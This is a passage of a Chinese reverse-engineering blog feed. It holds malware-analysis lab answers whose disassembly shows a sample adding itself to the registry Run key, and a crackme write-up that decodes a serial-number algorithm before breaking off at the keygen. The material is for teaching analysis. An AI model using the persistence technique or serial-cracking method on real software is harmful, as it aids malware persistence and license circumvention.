class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0040118F</span>  |.  <span class="hljs-number">51</span>            push ecx                                 ; /pHandle = kernel<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">5483</span>B<br><span class="hljs-attribute">00401190</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">3</span>F<span class="hljs-number">000</span>F<span class="hljs-number">00</span>   push <span class="hljs-number">0</span>xF<span class="hljs-number">003</span>F                             ; |Access = KEY_ALL_ACCESS<br><span class="hljs-attribute">00401195</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00401197</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">70714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407170</span>                   ; |Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-attribute">0040119C</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">02000080</span>   push <span class="hljs-number">0</span>x<span class="hljs-number">80000002</span>                          ; |hKey = HKEY_LOCAL_MACHINE<br><span class="hljs-attribute">004011A1</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegOpenKey&gt;; \RegOpenKeyExA<br><span class="hljs-attribute">004011A7</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">0</span>F         push <span class="hljs-number">0</span>xF                                 ; /BufSize = F (<span class="hljs-number">15</span>.)<br><span class="hljs-attribute">004011A9</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">0714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">004071</span>A<span class="hljs-number">0</span>                   ; |C:\Temp\cc.exe<br><span class="hljs-attribute">004011AE</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">1</span>                                 ; |ValueType = REG_SZ<br><span class="hljs-attribute">004011B0</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">004011B2</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">68714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407168</span>                   ; |Malware<br><span class="hljs-attribute">004011B7</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ; |<br><span class="hljs-attribute">004011BA</span>  |.  <span class="hljs-number">52</span>            push edx                                 ; |hKey = <span class="hljs-number">0</span>x<span class="hljs-number">23</span>C<br><span class="hljs-attribute">004011BB</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">00604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegSetValu&gt;; \RegSetValueExA<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-6.png"></p><p>等于“e”的时候，调用sleep函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-7.png"></p><p>都不满足的话就打印字符串“Error 3.2: Not a valid command provided”</p><h3 id="5-这个恶意代码中有什么本地特征吗？"><a href="#5-这个恶意代码中有什么本地特征吗？" class="headerlink" title="5.这个恶意代码中有什么本地特征吗？"></a>5.这个恶意代码中有什么本地特征吗？</h3><p>有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。</p><h3 id="6-这个恶意代码的目的是什么？-1"><a href="#6-这个恶意代码的目的是什么？-1" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。</p><h2 id="Lab-6-4"><a href="#Lab-6-4" class="headerlink" title="Lab 6-4"></a>Lab 6-4</h2><h3 id="1-在实验6-3和6-4的main函数中的调用之间的区别是什么？"><a href="#1-在实验6-3和6-4的main函数中的调用之间的区别是什么？" class="headerlink" title="1.在实验6-3和6-4的main函数中的调用之间的区别是什么？"></a>1.在实验6-3和6-4的main函数中的调用之间的区别是什么？</h3><p>加了一个for循环，sub_401040加了一个参数i。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-1.png"></p><h3 id="2-什么新的代码结构已经被添加到main中"><a href="#2-什么新的代码结构已经被添加到main中" class="headerlink" title="2.什么新的代码结构已经被添加到main中"></a>2.什么新的代码结构已经被添加到main中</h3><p>for循环结构</p><h3 id="3-这个实验的解析HTML的函数和前面实验中的那些有什么区别"><a href="#3-这个实验的解析HTML的函数和前面实验中的那些有什么区别" class="headerlink" title="3.这个实验的解析HTML的函数和前面实验中的那些有什么区别"></a>3.这个实验的解析HTML的函数和前面实验中的那些有什么区别</h3><p>主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-2.png"></p><h3 id="4-这个程序会运行多久？（假设它已经连接到互联网）"><a href="#4-这个程序会运行多久？（假设它已经连接到互联网）" class="headerlink" title="4.这个程序会运行多久？（假设它已经连接到互联网）"></a>4.这个程序会运行多久？（假设它已经连接到互联网）</h3><p>看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-3.png"></p><h3 id="5-在这个恶意代码中有什么新的基于网络的迹象吗？"><a href="#5-在这个恶意代码中有什么新的基于网络的迹象吗？" class="headerlink" title="5.在这个恶意代码中有什么新的基于网络的迹象吗？"></a>5.在这个恶意代码中有什么新的基于网络的迹象吗？</h3><p>就是InternetOpenA传入的szAgent参数不同了，每次都会变。</p><h3 id="6-这个恶意代码的目的是什么？-2"><a href="#6-这个恶意代码的目的是什么？-2" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>跟之前的基本一样，只是运行的时间变得特别长。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-6-1&quot;&gt;&lt;a href=&quot;#Lab-6-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 6-1&quot;&gt;&lt;/a&gt;Lab 6-1&lt;/h2&gt;&lt;h3 id=&quot;1-由main函数调用的唯一子过程中发现的主要代码结构是什么？&quot;&gt;&lt;a href=&quot;#1-</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-009</title>
    <link href="https://b1ackie.cn/2021/08/09/160CrackMe-009/"/>
    <id>https://b1ackie.cn/2021/08/09/160CrackMe-009/</id>
    <published>2021-08-09T10:00:15.000Z</published>
    <updated>2021-08-09T10:54:17.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。</p><p>比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。</p><p><img src="/2021/08/09/160CrackMe-009/4.png"></p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到需要输入name和key输入后弹出错误的提示框。</p><p><img src="/2021/08/09/160CrackMe-009/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳，无壳是用VB语言写的。</p><p><img src="/2021/08/09/160CrackMe-009/2.png"></p><p>使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。</p><p><img src="/2021/08/09/160CrackMe-009/3.png"></p><p>先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004020</span>EF   .  <span class="hljs-number">51</span>            push ecx                                 ; /Step8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004020</span>F0   .  <span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]          ; |<br><span class="hljs-number">004020</span>F3   .  BB <span class="hljs-number">02000000</span>   mov ebx,<span class="hljs-number">0</span>x2                              ; |<br><span class="hljs-number">004020</span>F8   .  <span class="hljs-number">52</span>            push edx                                 ; |/var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004020</span>F9   .  <span class="hljs-number">50</span>            push eax                                 ; ||retBuffer8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004020</span>FA   .  <span class="hljs-number">899</span>D <span class="hljs-number">54</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],ebx          ; ||<br><span class="hljs-symbol">00402100 </span>  .  <span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; ||<br><span class="hljs-symbol">00402106 </span>  .  FF15 <span class="hljs-number">18414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\__vbaLenVar<br><span class="hljs-number">0040210</span>C   .  <span class="hljs-number">8D8</span>D <span class="hljs-number">44</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]          ; |<br><span class="hljs-symbol">00402112 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |End8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402113 </span>  .  <span class="hljs-number">8D95</span> E8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]         ; |<br><span class="hljs-symbol">00402119 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Start8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040211</span>A   .  <span class="hljs-number">8D85</span> F8FEFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]         ; |<br><span class="hljs-symbol">00402120 </span>  .  <span class="hljs-number">52</span>            push edx                                 ; |TMPend8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402121 </span>  .  <span class="hljs-number">8D4</span>D DC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]          ; |<br><span class="hljs-symbol">00402124 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402125 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Counter8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402126 </span>  .  FF15 <span class="hljs-number">20414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForInit<br></code></pre></div></td></tr></table></figure><p>首先是对于name 的操作，获取了每一位的ascii码值，然后相加。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402134 </span>  . /<span class="hljs-number">0</span>F84 <span class="hljs-number">9</span>C000000 je Andréna.<span class="hljs-number">004021D6</span><br><span class="hljs-number">0040213</span>A   . |<span class="hljs-number">8D55</span> <span class="hljs-number">94</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">0040213</span>D   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-symbol">00402140 </span>  . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-symbol">00402141 </span>  . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402142 </span>  . |C745 <span class="hljs-number">9</span>C <span class="hljs-number">01000</span>&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x64],<span class="hljs-number">0</span>x1<br><span class="hljs-symbol">00402149 </span>  . |<span class="hljs-number">895</span>D <span class="hljs-number">94</span>       mov dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C],ebx<br><span class="hljs-number">0040214</span>C   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaI4Var&gt;;  Msvbvm50.__vbaI4Var<br><span class="hljs-symbol">00402152 </span>  . |<span class="hljs-number">8D4</span>D BC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x44]          ; |<br><span class="hljs-symbol">00402155 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; |Start = <span class="hljs-number">0</span>x18F3CC<br><span class="hljs-symbol">00402156 </span>  . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]          ; |<br><span class="hljs-symbol">00402159 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |dString8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040215</span>A   . |<span class="hljs-number">52</span>            push edx                                 ; |RetBUFFER = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">0040215</span>B   . |FF15 <span class="hljs-number">38414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     ; \获取每一位<br><span class="hljs-symbol">00402161 </span>  . |<span class="hljs-number">8D45</span> <span class="hljs-number">84</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-symbol">00402164 </span>  . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-symbol">00402167 </span>  . |<span class="hljs-number">50</span>            push eax                                 ; /String8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402168 </span>  . |<span class="hljs-number">51</span>            push ecx                                 ; |ARG2 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402169 </span>  . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrVa&gt;; \__vbaStrVarVal<br><span class="hljs-number">0040216</span>F   . |<span class="hljs-number">50</span>            push eax                                 ; /String = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-symbol">00402170 </span>  . |FF15 <span class="hljs-number">0</span>C414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     ; \转为ascii<br><span class="hljs-symbol">00402176 </span>  . |<span class="hljs-number">66</span>:<span class="hljs-number">8985</span> <span class="hljs-number">4</span>CFFF&gt;mov word ptr ss:[ebp-<span class="hljs-number">0</span>xB4],ax<br><span class="hljs-number">0040217</span>D   . |<span class="hljs-number">8D55</span> CC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402180 </span>  . |<span class="hljs-number">8D85</span> <span class="hljs-number">44</span>FFFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]<br><span class="hljs-symbol">00402186 </span>  . |<span class="hljs-number">52</span>            push edx                                 ; /var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402187 </span>  . |<span class="hljs-number">8D8</span>D <span class="hljs-number">74</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x8C]          ; |<br><span class="hljs-number">0040218</span>D   . |<span class="hljs-number">50</span>            push eax                                 ; |var28 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">0040218</span>E   . |<span class="hljs-number">51</span>            push ecx                                 ; |saveto8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040218</span>F   . |<span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; |<br><span class="hljs-symbol">00402195 </span>  . |FF15 <span class="hljs-number">94414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarAd&gt;; \相加<br><span class="hljs-number">0040219</span>B   . |<span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040219</span>D   . |<span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">004021</span>A0   . |FFD6          <span class="hljs-keyword">call</span> esi                                 ;  Msvbvm50.__vbaVarMove<br><span class="hljs-number">004021</span>A2   . |<span class="hljs-number">8D4</span>D A8       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x58]<br><span class="hljs-number">004021</span>A5   . |FF15 B8414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  Msvbvm50.__vbaFreeStr<br><span class="hljs-number">004021</span>AB   . |<span class="hljs-number">8D55</span> <span class="hljs-number">84</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x7C]<br><span class="hljs-number">004021</span>AE   . |<span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">004021</span>B1   . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-number">004021</span>B2   . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-number">004021</span>B3   . |<span class="hljs-number">53</span>            push ebx<br><span class="hljs-number">004021</span>B4   . |FFD7          <span class="hljs-keyword">call</span> edi                                 ;  Msvbvm50.__vbaFreeVarList<br><span class="hljs-number">004021</span>B6   . |<span class="hljs-number">83</span>C4 <span class="hljs-number">0</span>C       add esp,<span class="hljs-number">0</span>xC<br><span class="hljs-number">004021</span>B9   . |<span class="hljs-number">8D8</span>D E8FEFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]<br><span class="hljs-number">004021</span>BF   . |<span class="hljs-number">8D95</span> F8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]<br><span class="hljs-number">004021</span>C5   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-number">004021</span>C8   . |<span class="hljs-number">51</span>            push ecx                                 ; /TMPend8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004021</span>C9   . |<span class="hljs-number">52</span>            push edx                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004021</span>CA   . |<span class="hljs-number">50</span>            push eax                                 ; |Counter8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004021</span>CB   . |FF15 AC414000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForNext<br><span class="hljs-number">004021D1</span>   .^|E9 <span class="hljs-number">5</span>CFFFFFF   jmp Andréna.<span class="hljs-number">00402132</span><br></code></pre></div></td></tr></table></figure><p>然后所有name相加的结果乘以0x499602D2</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004021D6   &gt; \8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>004021D9   .  8D95 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br>004021DF   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; /var18 = 0018F404</span><br>004021E0   .  8D45 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]          <span class="hljs-comment">; |</span><br>004021E3   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |var28 = 0018F38C</span><br>004021E4   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |SaveTo8 = 0018F3CC</span><br>004021E5   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],<span class="hljs-number">0x499602D2</span>   <span class="hljs-comment">; |</span><br>004021EF   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x3</span>          <span class="hljs-comment">; |</span><br>004021F9   .  FF15 5C414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarMu&gt;<span class="hljs-comment">; \__vbaVarMul</span><br></code></pre></div></td></tr></table></figure><p>这个值再转为十进制的字符串。</p><p>可以看到这个值和计算器计算出来的是一样的。</p><p><img src="/2021/08/09/160CrackMe-009/5.png"></p><p><img src="/2021/08/09/160CrackMe-009/6.png"></p><p>最后就是使用“-”替换到第四位和第九位的字符。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402206 </span>  .  <span class="hljs-number">8</span>B1D A0414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaMi&gt;;  Msvbvm50.__vbaMidStmtVar<br><span class="hljs-number">0040220</span>C   .  <span class="hljs-number">8D4</span>D CC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-number">0040220</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402210 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">04</span>         push <span class="hljs-number">0</span>x4<br><span class="hljs-symbol">00402212 </span>  .  <span class="hljs-number">8D95</span> <span class="hljs-number">54</span>FFFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-symbol">00402218 </span>  .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040221</span>A   .  <span class="hljs-number">52</span>            push edx<br><span class="hljs-number">0040221</span>B   .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-symbol">00402225 </span>  .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-number">0040222</span>F   .  FFD3          <span class="hljs-keyword">call</span> ebx                                 ;  &lt;&amp;MSVBVM50.__vbaMidStmtVar&gt;<br><span class="hljs-symbol">00402231 </span>  .  <span class="hljs-number">8D45</span> CC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x34]<br><span class="hljs-symbol">00402234 </span>  .  <span class="hljs-number">8D8</span>D <span class="hljs-number">54</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC]<br><span class="hljs-number">0040223</span>A   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040223</span>B   .  <span class="hljs-number">6</span>A <span class="hljs-number">09</span>         push <span class="hljs-number">0</span>x9<br><span class="hljs-number">0040223</span>D   .  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x1<br><span class="hljs-number">0040223</span>F   .  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-symbol">00402240 </span>  .  C785 <span class="hljs-number">5</span>CFFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xA4],Andréna.<span class="hljs-number">0040</span>&gt;;  -<br><span class="hljs-number">0040224</span>A   .  C785 <span class="hljs-number">54</span>FFFFFF&gt;mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00402254 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx<br></code></pre></div></td></tr></table></figure><p>下面开始编写注册机</p><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><p>根据以上分析的结果</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 